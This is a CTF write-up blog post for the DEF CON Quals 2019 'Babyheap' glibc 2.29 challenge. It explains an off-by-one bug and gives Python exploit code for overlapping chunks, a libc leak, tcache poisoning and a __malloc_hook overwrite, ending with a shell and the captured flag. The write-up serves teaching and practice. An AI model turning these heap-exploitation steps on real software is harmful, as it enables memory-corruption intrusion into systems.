<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>Defcon Qual 2019 - Babyheap | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous><link rel=icon type=image/svg+xml href=/favicon.svg></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>Defcon Qual 2019 - Babyheap</h1><time datetime=2019-05-14T00:00:00+07:00>May 14, 2019</time></header><h2 id=intro>intro</h2><p>So, we get a heap pwn running with glibc 2.29 :0. Yes, this version of glibc already has the juicy tcache and introduce some mitigation (no simple double free, etc.).</p><p>Running this binary,</p><pre><code>-----Yet Another Babyheap!-----
[M]alloc
[F]ree
[S]how
[E]xit
------------------------
Command:
&gt;
</code></pre><ol><li><code>[M]alloc</code>, basically create chunk with 2 type of size 0xF8 and 0x178. Any size lower than that are set to the higher bound. So, for example, if you try to create chunk with size of 1, you&rsquo;ll get <code>malloc(0xF8)</code> and chunk size of 0xF9 you&rsquo;ll get <code>malloc(0x178)</code>.</li><li><code>[F]ree</code>, <code>memset(content, 0, chunk_request_size)</code> then <code>free()</code>, pointer also get NULLed at the end. So, no UaF i guess?</li><li><code>[S]how</code>, print the content of chunk.</li><li><code>[E]xit</code>, exit, ofc.</li></ol><h2 id=off-by-one>off-by-one</h2><p>In <code>[M]alloc</code>, user input to fill content handled like this,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#7aa2f7>read</span>(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a;font-weight:700>&amp;</span>buf, <span style=color:#e0af68>1</span>);
</span></span><span style=display:flex><span>  pos <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>while</span> (buf <span style=color:#9ece6a;font-weight:700>!=</span> <span style=color:#9ece6a>&#39;\n&#39;</span> <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> buf) {
</span></span><span style=display:flex><span>    (<span style=color:#9ece6a;font-weight:700>*</span>content)[pos] <span style=color:#9ece6a;font-weight:700>=</span> buf;
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>read</span>(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a;font-weight:700>&amp;</span>buf, <span style=color:#e0af68>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> (chunk_request_size <span style=color:#9ece6a;font-weight:700>==</span> pos<span style=color:#9ece6a;font-weight:700>++</span>)
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p>see it? user input terminated when pos reached <code>chunk_request_size</code>, instead of <code>chunk_request_size-1</code>. This is clearly off-by-one.</p><h2 id=attack>attack</h2><p>We already have off-by-one in creating chunk, we can create an overlapping chunk with overwriting next chunk metadata. Then, use it to corrupt the tcache free list in overlapping chunks. Before all of that, we need to find libc leak, How? Lets start it with initialize the chunks we need.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;0&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0xf8</span>, <span style=color:#9ece6a>&#39;1&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0xf8</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>1</span>, <span style=color:#9ece6a>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;3&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;4&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0xF8</span>, <span style=color:#9ece6a>&#39;5&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0xF8</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;6&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;7&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;8&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span>)
</span></span></code></pre></div><p>The idea is to corrupt chunk metadata (chunk size) to something larger than tcache could handle, for that we need to create overlapping chunk first.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># setup overlapping chunk</span>
</span></span><span style=display:flex><span>free(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># overwrite metadata of chunk 1</span>
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;0&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x81</span><span style=color:#9ece6a>&#39;</span>)
</span></span></code></pre></div><p>Since we have overwritten the size of chunk 1, if we free this chunk, instead of going to <code>tcache[0x100]</code> it&rsquo;ll go to <code>tcache[0x180]</code>. Because of that, if we create another request for <code>malloc(0x178)</code>, it&rsquo;ll go directly to chunk 1 where the size should be 0x100 and overlapping with chunk 2. The content of chunk 1 can directly overwrite chunk 2, thus we will make chunk 2 size large enough and still pointing to a &ldquo;valid&rdquo; chunk.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>free(<span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># now chunk 1 and 2 are overlapping (after another</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># malloc(0x178) request) since we want a libc leak,</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># we need something large enough to pass tcache (&gt; 0x500)</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># and also the size need to point another chunk to</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pass some check, here I set the size to 0x681.</span>
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;1&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0xf8</span> <span style=color:#9ece6a;font-weight:700>+</span> p16(<span style=color:#e0af68>0x681</span>))
</span></span></code></pre></div><p>Now, when chunk 2 gets freed, instead going to tcache bins, It&rsquo;ll go to unsorted bins and get the fd bk populated (libc leak here). Also, remember that <code>[F]ree</code> clears the content for <code>chunk_request_size</code>? This is why I created chunk 2 with size of 1 (<code>malloc(1, '2'</code>), instead of the whole content get cleared, it&rsquo;ll only clear the first byte of content/chunk.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># Instead of goind to tcache bin free list, chunk2</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># will goes to unsorted bin and we will get a nice</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># libc leak</span>
</span></span><span style=display:flex><span>free(<span style=color:#e0af68>2</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>1</span>, <span style=color:#9ece6a>&#39;A&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak <span style=color:#9ece6a;font-weight:700>=</span> show(<span style=color:#e0af68>2</span>)
</span></span><span style=display:flex><span>leak <span style=color:#9ece6a;font-weight:700>=</span> u64(leak<span style=color:#9ece6a;font-weight:700>.</span>ljust(<span style=color:#e0af68>8</span>, <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># main_arena trick</span>
</span></span><span style=display:flex><span>libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> (leak <span style=color:#9ece6a;font-weight:700>-</span> libc<span style=color:#9ece6a;font-weight:700>.</span>symbols[<span style=color:#9ece6a>&#39;__malloc_hook&#39;</span>]) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xFFFFFFFFFFFFF000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#9ece6a>print</span> <span style=color:#9ece6a>&#39;LIBC&#39;</span>, <span style=color:#9ece6a>hex</span>(libc<span style=color:#9ece6a;font-weight:700>.</span>address)
</span></span></code></pre></div><p>After this we only need to do tcache poisoning, with creating another overlapping chunks first,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># setting up another overlapping chunks</span>
</span></span><span style=display:flex><span>free(<span style=color:#e0af68>4</span>)
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;4&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x178</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x81</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>free(<span style=color:#e0af68>6</span>)
</span></span><span style=display:flex><span>free(<span style=color:#e0af68>5</span>)
</span></span></code></pre></div><p>then, do the tcache poisoning,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># tcache poisoning</span>
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;5&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x100</span> <span style=color:#9ece6a;font-weight:700>+</span>
</span></span><span style=display:flex><span>	p64(libc<span style=color:#9ece6a;font-weight:700>.</span>symbols[<span style=color:#9ece6a>&#39;__malloc_hook&#39;</span>])<span style=color:#9ece6a;font-weight:700>.</span>replace(<span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;&#39;</span>))
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>, <span style=color:#9ece6a>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># overwrite __malloc_hook with one_gadge</span>
</span></span><span style=display:flex><span>malloc(<span style=color:#e0af68>0x178</span>,
</span></span><span style=display:flex><span>	p64(libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x106ef8</span>)<span style=color:#9ece6a;font-weight:700>.</span>replace(<span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;&#39;</span>))
</span></span><span style=display:flex><span>free(<span style=color:#e0af68>8</span>)
</span></span></code></pre></div><p>profit</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;M&#39;</span>) <span style=color:#414868;font-style:italic># trigger malloc</span>
</span></span><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;1&#39;</span>) <span style=color:#414868;font-style:italic># trigger malloc</span>
</span></span></code></pre></div><h2 id=flaggg>flaggg</h2><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>λ › REMOTE<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>1</span> python2 solve.py
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>+<span style=color:#9ece6a;font-weight:700>]</span> Opening connection to babyheap.quals2019.oooverflow.io on port 5000: Done
</span></span><span style=display:flex><span>LIBC 0x7f51a413b000
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>*<span style=color:#9ece6a;font-weight:700>]</span> Switching to interactive mode
</span></span><span style=display:flex><span>$ id
</span></span><span style=display:flex><span>uid<span style=color:#9ece6a;font-weight:700>=</span>65534<span style=color:#9ece6a;font-weight:700>(</span>nobody<span style=color:#9ece6a;font-weight:700>)</span> gid<span style=color:#9ece6a;font-weight:700>=</span>65534<span style=color:#9ece6a;font-weight:700>(</span>nogroup<span style=color:#9ece6a;font-weight:700>)</span> groups<span style=color:#9ece6a;font-weight:700>=</span>65534<span style=color:#9ece6a;font-weight:700>(</span>nogroup<span style=color:#9ece6a;font-weight:700>)</span>
</span></span><span style=display:flex><span>$ cat /flag
</span></span><span style=display:flex><span>OOO<span style=color:#9ece6a;font-weight:700>{</span>4_b4byh34p_h45_nOOO_n4m3<span style=color:#9ece6a;font-weight:700>}</span>
</span></span><span style=display:flex><span>$
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>*<span style=color:#9ece6a;font-weight:700>]</span> Interrupted
</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>*<span style=color:#9ece6a;font-weight:700>]</span> Closed connection to babyheap.quals2019.oooverflow.io port <span style=color:#e0af68>5000</span>
</span></span></code></pre></div><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li><li><a href=/tags/heap/>Heap</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>